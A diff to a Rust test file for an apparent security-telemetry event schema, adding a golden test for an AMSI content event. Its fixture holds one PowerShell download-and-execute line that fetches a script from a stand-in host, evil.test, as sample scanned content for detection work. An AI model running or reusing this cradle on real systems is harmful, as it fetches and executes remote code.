@@ -9,13 +9,13 @@
 use std::net::IpAddr;
 
 use schema::{
-    AssemblyLoadEvent, AuthEvent, AuthKind, AuthOutcome, BpfEvent, CapSetEvent, ConnectEvent,
-    DnsQueryEvent, Event, EventMeta, ExecEvent, FileChmodEvent, FileChownEvent, FileDeleteEvent,
-    FileOpenEvent, FileQuarantineEvent, FileRemovexattrEvent, FileRenameEvent, FileSetxattrEvent,
-    FileWriteEvent, GatekeeperVerdictEvent, HttpClientCount, HttpEvidence, HttpRequestEvent,
-    HttpSignature, HttpSummaryEvent, IdentityChangeEvent, IdentityChangeKind, ImageLoadEvent,
-    KernelModuleAction, KernelModuleEvent, ListenPortEvent, MemfdCreateEvent, MountEvent,
-    NamespaceEvent, NamespaceSyscall, NetworkFlowEvent, POLICY_MECHANISM_SELINUX,
+    AmsiContentEvent, AssemblyLoadEvent, AuthEvent, AuthKind, AuthOutcome, BpfEvent, CapSetEvent,
+    ConnectEvent, DnsQueryEvent, Event, EventMeta, ExecEvent, FileChmodEvent, FileChownEvent,
+    FileDeleteEvent, FileOpenEvent, FileQuarantineEvent, FileRemovexattrEvent, FileRenameEvent,
+    FileSetxattrEvent, FileWriteEvent, GatekeeperVerdictEvent, HttpClientCount, HttpEvidence,
+    HttpRequestEvent, HttpSignature, HttpSummaryEvent, IdentityChangeEvent, IdentityChangeKind,
+    ImageLoadEvent, KernelModuleAction, KernelModuleEvent, ListenPortEvent, MemfdCreateEvent,
+    MountEvent, NamespaceEvent, NamespaceSyscall, NetworkFlowEvent, POLICY_MECHANISM_SELINUX,
     PolicyDenialEvent, PrctlEvent, ProcessVmReadEvent, ProcessVmWriteEvent, PtraceEvent,
     ReadlineInputEvent, RegistrySetEvent, ScriptBlockEvent, ShellType, SignalEvent,
     SmbConnectEvent, SocketAcceptEvent, SocketBindEvent, SocketListenEvent, TccDecisionEvent,
@@ -447,6 +447,41 @@ fn wmi_activity_golden() {
             method: Some("Win32_Process.Create".into()),
         }),
         "wmi_activity",
+    );
+}
+
+#[test]
+fn amsi_content_golden() {
+    assert_golden(
+        &Event::AmsiContent(AmsiContentEvent {
+            meta: EventMeta {
+                pid: 6144,
+                ppid: 0,
+                user: User::Windows {
+                    sid: "S-1-5-21-1004336348-1177238915-682003330-1001".into(),
+                    integrity_level: Some(0x2000),
+                },
+                timestamp_ns: 1_759_300_000_000_000_000,
+                comm: "powershell.exe".into(),
+                container: None,
+                process_generation: None,
+                parent_process_generation: None,
+            },
+            session: 63_544,
+            app_name:
+                r"PowerShell_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe_10.0.26100.1"
+                    .into(),
+            content_name: None,
+            content_size: 154,
+            original_size: 154,
+            text: Some(
+                "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')".into(),
+            ),
+            text_truncated: false,
+            content_hash: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08".into(),
+            scan_result: 1,
+        }),
+        "amsi_content",
     );
 }
 
@@ -1834,6 +1869,18 @@ fn meta_accessor_covers_all_variants() {
             namespace: String::new(),
             query: None,
             method: None,
+        }),
+        Event::AmsiContent(AmsiContentEvent {
+            meta: meta.clone(),
+            session: 0,
+            app_name: String::new(),
+            content_name: None,
+            content_size: 0,
+            original_size: 0,
+            text: None,
+            text_truncated: false,
+            content_hash: String::new(),
+            scan_result: 0,
         }),
         Event::AssemblyLoad(AssemblyLoadEvent {
             meta: meta.clone(),
